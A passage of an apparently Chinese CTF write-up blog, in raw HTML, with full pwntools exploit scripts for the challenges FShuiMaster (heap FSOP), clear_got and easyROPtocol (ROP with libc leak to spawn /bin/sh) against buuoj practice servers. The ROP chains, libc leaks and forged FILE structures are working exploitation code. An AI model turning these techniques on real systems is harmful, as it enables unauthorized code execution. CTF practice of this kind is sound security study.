IO_str_jumps <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">+</span> <span class=\"token number\">0x3e8360</span>\n\n    fake_file <span class=\"token operator\">=</span> pack_file<span class=\"token punctuation\">(</span>_IO_read_base <span class=\"token operator\">=</span> IO_list_all<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span>\n                    _IO_write_base<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                    _IO_write_ptr<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n                    _IO_buf_base<span class=\"token operator\">=</span>binsh_addr<span class=\"token punctuation\">,</span>\n                    _mode<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span>\n    fake_file <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>IO_str_jumps<span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x508</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#5</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x4f8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#6</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x518</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#7</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x518</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#8</span>\n\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x508</span> <span class=\"token punctuation\">,</span>  <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#9</span>\n    show<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span>\n    heap_addr <span class=\"token operator\">=</span> uu64<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x518</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#10</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x518</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">5</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span>__malloc_hook <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> <span class=\"token number\">1168</span><span class=\"token punctuation\">,</span>__malloc_hook <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> <span class=\"token number\">1168</span><span class=\"token punctuation\">,</span>heap_addr<span class=\"token operator\">+</span><span class=\"token number\">0xf10</span><span class=\"token punctuation\">,</span>IO_list_all<span class=\"token operator\">-</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x528</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x4f8</span> <span class=\"token punctuation\">,</span> fake_file<span class=\"token punctuation\">[</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">5</span> <span class=\"token punctuation\">,</span> fake_file<span class=\"token punctuation\">[</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># dbg()</span>\n\n    <span class=\"token comment\"># p.success(getShell())</span>\n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nattack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   FShuiMaster.py\n@Time    :   2022/02/12 14:54:04\n@Author  :   Niyah \n'''</span></code></pre>\n<h3 id=\"clear_got\"><a class=\"markdownIt-Anchor\" href=\"#clear_got\">#</a> clear_got</h3>\n<p>很明显的栈溢出，程序中还给了几个 gadget 难点在于如何去利用本题最后把 got 表给扬了。</p>\n<p>我的思路是，在程序进行溢出劫持控制流时刚好寄存器 rax 的值为 0，那么就趁这次机会写一下 got 表方便下次进行 read，我们把一些不中用的函数 got 表填 ret ，这样下次重新执行 main 时才不会出错</p>\n<p>然而之后重新进入 main 的时候因为 got 表的缺失所以不能泄露了，因此我选择在第一次进行 rop 的时候就利用下面的 gadget 片段来进行系统调用泄露出 libc 可以直接去泄露 stdout</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0000000000400773</span>                 push    rbp\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0000000000400774</span>                 mov     rbp<span class=\"token punctuation\">,</span> rsp\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0000000000400777</span>                 mov     rax<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">000000000040077</span>E                 syscall                 <span class=\"token punctuation\">;</span> LINUX <span class=\"token operator\">-</span> sys_write\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0000000000400780</span>                 retn</code></pre>\n<p>重新进入 main 函数，直接把无关函数调用 return，最后 read 将 rop 链弄到当前栈上（当前栈关系到第一次 Rop 时输入的 rbp，可以是 bss 段）输入 system (&quot;/bin/sh&quot;) 的 rop 链 getshell</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./clear_got'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\nlibc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.23-buu.so'</span><span class=\"token punctuation\">)</span>\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\"># p = process(['qemu-arm','-g','1234', binary])</span>\n    <span class=\"token comment\"># p = process(['qemu-aarch64','-L','','-g','1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'node4.buuoj.cn'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'28198'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu64<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu32<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': \\033[1;36m 0x%x \\033[0m'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">ras</span><span class=\"token punctuation\">(</span> data <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span> <span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> data\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># one_gad = one_gadget(libc.path)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n    stdout <span class=\"token operator\">=</span> <span class=\"token number\">0x601060</span>\n    pop_rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000004007f3</span>\n    pop_rsi_r15_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000004007f1</span>\n    rax_syscall_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000400777</span>\n    syscall_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000040077E</span>\n    syscall_ret1 <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000040076E</span>\n    main_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000004006F3</span>\n    leave_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000400761</span>\n    ret <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000400762</span>\n\n    fake_puts <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000400773</span>\n    fake_funk <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000400782</span>\n    fake_read <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000040076E</span>\n    got <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000601018</span>\n\n    <span class=\"token comment\"># dbg('*0x000000000400762')</span>\n    got_table <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        ret <span class=\"token punctuation\">,</span> ret<span class=\"token punctuation\">,</span>\n        ret <span class=\"token punctuation\">,</span> ret<span class=\"token punctuation\">,</span>\n        fake_read <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        main_addr\n    <span class=\"token punctuation\">)</span>\n\n    payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        pop_rdi_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        pop_rsi_r15_ret <span class=\"token punctuation\">,</span> got <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        syscall_ret <span class=\"token punctuation\">,</span>\n        pop_rdi_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n        pop_rsi_r15_ret <span class=\"token punctuation\">,</span> stdout <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        rax_syscall_ret<span class=\"token punctuation\">,</span>\n        main_addr\n    <span class=\"token punctuation\">)</span>\n\n\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'competition.///'</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x60</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x601080</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> payload <span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># # dbg()</span>\n    <span class=\"token builtin\">raw_input</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    se<span class=\"token punctuation\">(</span>got_table<span class=\"token punctuation\">)</span>\n\n    libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span>\n    system_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span>\n    binsh_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token builtin\">raw_input</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span>\n\n    se<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># p.success(getShell())</span>\n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nattack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   clear_got.py\n@Time    :   2022/02/12 15:54:52\n@Author  :   Niyah \n'''</span></code></pre>\n<h3 id=\"easyroptocol\"><a class=\"markdownIt-Anchor\" href=\"#easyroptocol\">#</a> easyROPtocol</h3>\n<p>同样是比较直接的栈溢出，程序最多可以保留四个 tcp ，每个 tcp 数据段的长度大于 0xf00 而 submit 时直接将所有 tcp 数据复制到了栈上，给栈开辟的空间却只有差不多 0x3000 大小，这样就造成了栈溢出</p>\n<p>比较消耗时间地方就是输入的 tcp 需要 check 一下检查一下 head ，这个比较简单，第二个 check 就是差不多一个校验位，对 &quot;fakeipheadfa&quot; 和 tcp 包括头在内的所有数据每一字进行循环异或得到一个校验位</p>\n<p>进行两次 ROP 的操作，第一次使用 ret2csu 泄露出 libc 并返回到 mian 函数中，第二次 ROP 用 orw 泄露出 flag ，这里有一个小细节，由于第一次 ROP 的时候 payload 较长，因此 free 掉之后会有很多残留，因此最好把不需要的地方用’\\x00’来填充，这样校验的时候就不会出错，由于第一次的 ROP 没有地址的变化，我们可以直接动调最后 cmp 的时候查看，但是第二次 ROP 就需要我们来自己算了</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./easyROPtocol'</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\nlibc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.31.so'</span><span class=\"token punctuation\">)</span>\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'node4.buuoj.cn'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token number\">28856</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu64<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu32<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': \\033[1;36m 0x%x \\033[0m'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token 